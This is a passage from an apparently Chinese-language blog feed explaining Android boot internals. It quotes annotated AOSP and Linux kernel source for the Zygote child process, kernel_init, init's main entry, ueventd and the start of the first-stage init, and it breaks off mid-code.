class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Runnable <span class="title function_">handleChildProc</span><span class="params">(ZygoteArguments parsedArgs,</span></span><br><span class="line"><span class="params">        FileDescriptor pipeFd, <span class="type">boolean</span> isZygote)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    closeSocket();</span><br><span class="line"> </span><br><span class="line">    Zygote.setAppProcessName(parsedArgs, TAG);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// End of the postFork event.</span></span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">    <span class="keyword">if</span> (parsedArgs.mInvokeWith != <span class="literal">null</span>) &#123;</span><br><span class="line">        WrapperInit.execApplication(parsedArgs.mInvokeWith,</span><br><span class="line">                parsedArgs.mNiceName, parsedArgs.mTargetSdkVersion,</span><br><span class="line">                VMRuntime.getCurrentInstructionSet(),</span><br><span class="line">                pipeFd, parsedArgs.mRemainingArgs);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Should not get here.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;WrapperInit.execApplication unexpectedly returned&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isZygote) &#123;</span><br><span class="line">            <span class="comment">//App进程将会调用到这里，执行目标类的main()方法</span></span><br><span class="line">            <span class="keyword">return</span> ZygoteInit.zygoteInit(parsedArgs.mTargetSdkVersion,</span><br><span class="line">                    parsedArgs.mDisabledCompatChanges,</span><br><span class="line">                    parsedArgs.mRemainingArgs, <span class="literal">null</span> <span class="comment">/* classLoader */</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ZygoteInit.childZygoteInit(</span><br><span class="line">                    parsedArgs.mRemainingArgs  <span class="comment">/* classLoader */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/images/20240302/20240302001.png"></p><ol><li>开启虚拟器</li><li>注册了JNI</li><li>通过JNI调用ZygoteInit的main函数进入Zygote的Java框架层</li><li>创建了服务端Socket</li><li>预加载类和资源</li><li>启动SystemServer进程</li><li>通过runSelectLoop函数无限循环等待如AMS等的请求</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 init进程解析</title>
      <link href="/2024/02/25/2024-02-25/"/>
      <url>/2024/02/25/2024-02-25/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当bootloader启动后，启动kernel，kernel启动完后，在用户空间启动init进程，再通过init进程，来读取init.rc中的相关配置，从而来启动其他相关进程以及其他操作。<br>init进程启动主要分为两个阶段：</p><p>第一个阶段负责：</p><ul><li>创建文件系统目录并挂载相关的文件系统</li><li>初始化日志输出</li><li>启用SELinux安全策略</li><li>为第二阶段做准备</li></ul><p>第二阶段负责：</p><ul><li>创建进程会话密钥、并初始化属性系统</li><li>执行SELinux第二阶段、并恢复一些文件安全上下文</li><li>新建epoll、并初始化子进程终止信号处理函数</li><li>设置其他系统属性、并开启属性服务</li><li>解析init.rc等文件，建立rc文件的action、service，启动其他进程</li></ul><h4 id="init进程如何被启动？"><a href="#init进程如何被启动？" class="headerlink" title="init进程如何被启动？"></a>init进程如何被启动？</h4><p>init进程是在Kernel启动后，启动的第一个用户空间进程，PID为1<br><strong>kernel-5.10/init/main.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __ref <span class="title function_">kernel_init</span><span class="params">(<span class="type">void</span> *unused)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"> </span><br><span class="line">    kernel_init_freeable();<span class="comment">//进行init进程的一些初始化操作</span></span><br><span class="line">    <span class="comment">/* need to finish all async __init code before freeing the memory */</span></span><br><span class="line">    async_synchronize_full();<span class="comment">//等待所有异步调用执行完成，在释放内存前，必须完成所有的异步 __init 代码</span></span><br><span class="line">    ftrace_free_init_mem();</span><br><span class="line">    jump_label_invalidate_initmem();</span><br><span class="line">    free_initmem();<span class="comment">//释放所有init.*中的内存</span></span><br><span class="line">    mark_readonly();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Kernel mappings are now finalized - update the userspace page-table</span></span><br><span class="line"><span class="comment">     * to finalize PTI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    pti_finalize();</span><br><span class="line"> </span><br><span class="line">    system_state = SYSTEM_RUNNING;<span class="comment">//设置系统状态为运行状态</span></span><br><span class="line">    numa_default_policy();<span class="comment">//设定NUMA系统的默认内存访问策略</span></span><br><span class="line"> </span><br><span class="line">    rcu_end_inkernel_boot();</span><br><span class="line"> </span><br><span class="line">    bootprof_log_boot(<span class="string">&quot;Kernel_init_done&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ramdisk_execute_command) &#123;<span class="comment">//ramdisk_execute_command的值为“/init”</span></span><br><span class="line">        ret = run_init_process(ramdisk_execute_command);<span class="comment">//运行根目录下的init进程 *****</span></span><br><span class="line">        <span class="keyword">if</span> (!ret)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        pr_err(<span class="string">&quot;Failed to execute %s (error %d)\n&quot;</span>,</span><br><span class="line">               ramdisk_execute_command, ret);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We try each of these until one succeeds.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The Bourne shell can be used instead of init if we are</span></span><br><span class="line"><span class="comment">     * trying to recover a really broken machine.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (execute_command) &#123;<span class="comment">//execute_command的值如果有定义就去根目录下找对应的应用程序,然后启动</span></span><br><span class="line">        ret = run_init_process(execute_command);</span><br><span class="line">        <span class="keyword">if</span> (!ret)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        panic(<span class="string">&quot;Requested init %s failed (error %d).&quot;</span>,</span><br><span class="line">              execute_command, ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!try_to_run_init_process(<span class="string">&quot;/sbin/init&quot;</span>) ||</span><br><span class="line">        !try_to_run_init_process(<span class="string">&quot;/etc/init&quot;</span>) ||</span><br><span class="line">        !try_to_run_init_process(<span class="string">&quot;/bin/init&quot;</span>) ||</span><br><span class="line">        !try_to_run_init_process(<span class="string">&quot;/bin/sh&quot;</span>))<span class="comment">//如果ramdisk_execute_command和execute_command定义的应用程序都没有找到，</span></span><br><span class="line">    <span class="comment">//就到根目录下找 /sbin/init，/etc/init，/bin/init,/bin/sh 这四个应用程序进行启动</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    panic(<span class="string">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class="line">          <span class="string">&quot;See Linux Documentation/admin-guide/init.rst for guidance.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在/kernel/init/mian.c#kernel_init()方法调用了run_init_process()进行启动init进程</p><h3 id="init进程入口"><a href="#init进程入口" class="headerlink" title="init进程入口"></a>init进程入口</h3><p>在Android Q（10.0）之前的init入口函数是init.cpp，从Android Q（10.0）开始init的入口函数是main.cpp，把各个阶段的操作分离开来，是代码更加简洁。<br>进入到main.cpp#main()<br><strong>system/core/init/main.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 1.第一个参数argc表示参数个数，第二个参数是参数列表，也就是具体的参数</span></span><br><span class="line"><span class="comment"> * 2.main函数有四个参数入口，</span></span><br><span class="line"><span class="comment"> *一是参数中有ueventd，进入ueventd_main</span></span><br><span class="line"><span class="comment"> *二是参数中有subcontext，进入InitLogging 和SubcontextMain</span></span><br><span class="line"><span class="comment"> *三是参数中有selinux_setup，进入SetupSelinux</span></span><br><span class="line"><span class="comment"> *四是参数中有second_stage，进入SecondStageMain</span></span><br><span class="line"><span class="comment"> * 3.main的执行顺序如下：</span></span><br><span class="line"><span class="comment">   *  (1)ueventd_main    init进程创建子进程ueventd，</span></span><br><span class="line"><span class="comment">   *      并将创建设备节点文件的工作托付给ueventd，ueventd通过两种方式创建设备节点文件</span></span><br><span class="line"><span class="comment">   *  (2)FirstStageMain  启动第一阶段</span></span><br><span class="line"><span class="comment">   *  (3)SetupSelinux     加载selinux规则，并设置selinux日志,完成SELinux相关工作</span></span><br><span class="line"><span class="comment">   *  (4)SecondStageMain  启动第二阶段</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __has_feature(address_sanitizer)</span></span><br><span class="line">    __asan_set_error_report_callback(AsanReportCallback);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// Boost prio which will be restored later</span></span><br><span class="line">    setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">-20</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//当argv[0]的内容为ueventd时，strcmp的值为0，ueventd主要是负责设备节点的创建、权限设定等一些列工作</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(basename(argv[<span class="number">0</span>]), <span class="string">&quot;ueventd&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ueventd_main(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//当传入的参数个数大于1时</span></span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//参数为subcontext，初始化日志系统</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;subcontext&quot;</span>)) &#123;</span><br><span class="line">            android::base::InitLogging(argv, &amp;android::base::KernelLogger);</span><br><span class="line">            <span class="type">const</span> BuiltinFunctionMap&amp; function_map = GetBuiltinFunctionMap();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> SubcontextMain(argc, argv, &amp;function_map);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//参数为selinux_setup，启动Selinux安全策略</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;selinux_setup&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> SetupSelinux(argv);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//参数为“sencond_stage”，启动init进程第二阶段</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;second_stage&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> SecondStageMain(argc, argv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//默认启动init进程第一阶段</span></span><br><span class="line">    <span class="keyword">return</span> FirstStageMain(argc, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ueventd-main"><a href="#ueventd-main" class="headerlink" title="ueventd_main()"></a>ueventd_main()</h3><p>Android根文件系统的镜像中不存在“/dev”目录，该目录是init进程启动后动态创建的。所以，建立Android中设备节点文件需要init进程完成，为此init进程创建子进程ueventd，并将创建设备节点文件的工作托付给ueventd。<br>ueventd通过两种方式创建设备节点文件：<br>第一种方式对应“冷插拔”（Cold Plug），即以预先定义的设备信息为基础，当ueventd启动后，同一创建设备节点文件。这一类设备节点文件也被称为静态节点文件。<br>第二种方式对应“热插拔”（Hot Plug），即在系统运行中，当有设备插入USB端口时，ueventd就会接收到这一事件，为插入的设备动态创建设备节点文件。这一类设备节点文件也被称为动态节点文件。<br>进入ueventd.cpp#ueventd_main()<br><strong>system/core/init/ueventd.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ueventd_main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * init sets the umask to 077 for forked processes. We need to</span></span><br><span class="line"><span class="comment">     * create files with exact permissions, without modification by</span></span><br><span class="line"><span class="comment">     * the umask.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//设置新建文件的默认值，这个与chmod相反，这里相当于新建文件后的权限为666</span></span><br><span class="line">    umask(<span class="number">000</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//初始化内核日志，位于节点/dev/kmsg，此时logd、logcat进程还没有起来</span></span><br><span class="line">    <span class="comment">//采用kernel的log系统，打开的设备节点/dev/kmsg，那么可通过cat /dev/kmsg来获取内核log</span></span><br><span class="line">    android::base::InitLogging(argv, &amp;android::base::KernelLogger);</span><br><span class="line"> </span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">&quot;ueventd started!&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//注册selinux相关的用于打印log的回调函数</span></span><br><span class="line">    SelinuxSetupKernelLogging();</span><br><span class="line">    SelabelInitialize();</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;UeventHandler&gt;&gt; uevent_handlers;</span><br><span class="line">    <span class="comment">//解析xml，根据不同SOC厂商获取不同的hardware rc文件</span></span><br><span class="line">    <span class="keyword">auto</span> ueventd_configuration = GetConfiguration();</span><br><span class="line"> </span><br><span class="line">    uevent_handlers.emplace_back(<span class="built_in">std</span>::make_unique&lt;DeviceHandler&gt;(</span><br><span class="line">            <span class="built_in">std</span>::move(ueventd_configuration.dev_permissions),</span><br><span class="line">            <span class="built_in">std</span>::move(ueventd_configuration.sysfs_permissions),</span><br><span class="line">            <span class="built_in">std</span>::move(ueventd_configuration.subsystems), android::fs_mgr::GetBootDevices(), <span class="literal">true</span>));</span><br><span class="line">    uevent_handlers.emplace_back(<span class="built_in">std</span>::make_unique&lt;FirmwareHandler&gt;(</span><br><span class="line">            <span class="built_in">std</span>::move(ueventd_configuration.firmware_directories),</span><br><span class="line">            <span class="built_in">std</span>::move(ueventd_configuration.external_firmware_handlers)));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//冷启动</span></span><br><span class="line">    <span class="keyword">if</span> (ueventd_configuration.enable_modalias_handling) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; base_paths = &#123;<span class="string">&quot;/odm/lib/modules&quot;</span>, <span class="string">&quot;/vendor/lib/modules&quot;</span>&#125;;</span><br><span class="line">        uevent_handlers.emplace_back(<span class="built_in">std</span>::make_unique&lt;ModaliasHandler&gt;(base_paths));</span><br><span class="line">    &#125;</span><br><span class="line">    UeventListener <span class="title function_">uevent_listener</span><span class="params">(ueventd_configuration.uevent_socket_rcvbuf_size)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!android::base::GetBoolProperty(kColdBootDoneProp, <span class="literal">false</span>)) &#123;</span><br><span class="line">        ColdBoot <span class="title function_">cold_boot</span><span class="params">(uevent_listener, uevent_handlers,</span></span><br><span class="line"><span class="params">                           ueventd_configuration.enable_parallel_restorecon)</span>;</span><br><span class="line">        cold_boot.Run();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; uevent_handler : uevent_handlers) &#123;</span><br><span class="line">        uevent_handler-&gt;ColdbootDone();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//忽略子进程终止信号</span></span><br><span class="line">    signal(SIGCHLD, SIG_IGN);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在最后一次调用waitpid()和为上面的sigchld设置SIG_IGN之间退出的获取和挂起的子级</span></span><br><span class="line">    <span class="keyword">while</span> (waitpid(<span class="number">-1</span>, nullptr, WNOHANG) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Restore prio before main loop</span></span><br><span class="line">    setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//监听来自驱动的uevent，进行“热插拔”处理</span></span><br><span class="line">    uevent_listener.Poll([&amp;uevent_handlers](<span class="type">const</span> Uevent&amp; uevent) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; uevent_handler : uevent_handlers) &#123;</span><br><span class="line">            uevent_handler-&gt;HandleUevent(uevent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ListenerAction::kContinue;</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="init进程启动第一阶段first-stage-init-cpp"><a href="#init进程启动第一阶段first-stage-init-cpp" class="headerlink" title="init进程启动第一阶段first_stage_init.cpp"></a>init进程启动第一阶段first_stage_init.cpp</h3><p>主要负责：</p><ul><li>创建文件系统目录并挂载相关的文件系统</li><li>初始化日志输出</li><li>启用SELinux安全策略</li><li>为第二阶段做准备</li></ul><p><strong>system/core/init/first_stage_init.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FirstStageMain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="comment">//init crash时重启引导加载程序</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">//这个函数主要作用将各种信号量，如SIGABRT,SIGBUS等的行为设置为SA_RESTART,一旦监听到这些信号即执行重启系统</span></span><br><span class="line">    <span class="keyword">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;</span><br><span class="line">        InstallRebootSignalHandlers();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    boot_clock::time_point start_time = boot_clock::now();</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="type">int</span>&gt;&gt; errors;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> CHECKCALL(x) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((x) != 0) errors.emplace_back(#x <span class="string">&quot; failed&quot;</span>, errno);</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Clear the umask.</span></span><br><span class="line">    <span class="comment">//清空文件权限</span></span><br><span class="line">    umask(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    CHECKCALL(clearenv());</span><br><span class="line">    CHECKCALL(setenv(<span class="string">&quot;PATH&quot;</span>, _PATH_DEFPATH, <span class="number">1</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在RAM内存上获取基本的文件系统，剩余的被rc文件所用</span></span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_NOSUID, <span class="string">&quot;mode=0755&quot;</span>));</span><br><span class="line">    CHECKCALL(mkdir(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0755</span>));</span><br><span class="line">    CHECKCALL(mkdir(<span class="string">&quot;/dev/socket&quot;</span>, <span class="number">0755</span>));</span><br><span class="line">    CHECKCALL(mkdir(<span class="string">&quot;/dev/dm-user&quot;</span>, <span class="number">0755</span>));</span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MAKE_STR(x) __STRING(x)</span></span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="string">&quot;hidepid=2,gid=&quot;</span> MAKE_STR(AID_READPROC)));</span><br><span class="line">    <span class="meta">#<span class="keyword">undef</span> MAKE_STR</span></span><br><span class="line">    <span class="comment">//非特权应用不能使用Android cmdline</span></span><br><span class="line">    CHECKCALL(chmod(<span class="string">&quot;/proc/cmdline&quot;</span>, <span class="number">0440</span>));</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> cmdline;</span><br><span class="line">    android::base::ReadFileToString(<span class="string">&quot;/proc/cmdline&quot;</span>, &amp;cmdline);</span><br><span class="line">    <span class="comment">// Don&#x27;t expose the raw bootconfig to unprivileged processes.</span></span><br><span class="line">    chmod(<span class="string">&quot;/proc/bootconfig&quot;</span>, <span class="number">0440</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> bootconfig;</span><br><span class="line">    android::base::ReadFileToString(<span class="string">&quot;/proc/bootconfig&quot;</span>, &amp;bootconfig);</span><br><span class="line">    <span class="type">gid_t</span> groups[] = &#123;AID_READPROC&#125;;</span><br><span class="line">    CHECKCALL(setgroups(arraysize(groups), groups));</span><br><span class="line">    CHECKCALL(mount(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span 